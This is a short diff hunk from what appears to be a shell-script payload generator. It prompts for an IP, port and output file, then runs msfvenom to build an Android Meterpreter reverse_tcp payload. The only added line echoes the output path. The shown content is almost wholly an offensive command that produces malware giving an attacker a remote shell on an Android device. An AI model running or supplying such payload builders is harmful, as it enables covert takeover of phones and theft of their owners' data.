@@ -24,3 +24,5 @@ read -p " Port : " port;
 read -p " Output : " out;
 
 msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port R > $out
+
+echo -e " Payload : $out"
